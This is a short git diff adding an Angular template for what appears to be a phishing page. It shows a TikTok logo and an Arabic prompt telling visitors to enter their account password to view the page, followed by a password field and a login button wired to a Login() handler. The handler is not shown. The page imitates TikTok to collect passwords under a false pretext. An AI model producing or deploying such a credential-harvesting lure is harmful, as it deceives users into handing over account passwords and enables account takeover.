@@ -1,0 +1,13 @@
+
+<section>
+  <div>
+    <img src="../assets/TikTok.png" />
+  </div>
+  <h2>الرجاء إدخال كلمة مرور حسابك لمشاهدة هذه الصفحة</h2>
+  <div class="form" [formGroup]="form">
+    <p>كلمة المرور : </p>
+    <input type="password" formControlName="pass"/>
+    <button type="submit" (click)="Login()">تسجيل الدخول</button>
+    <span style="color: red;margin-top: 3%;" *ngIf="form.get('pass')?.hasError('required')">كلمة المرور مطلوبة</span>
+  </div>
+</section>
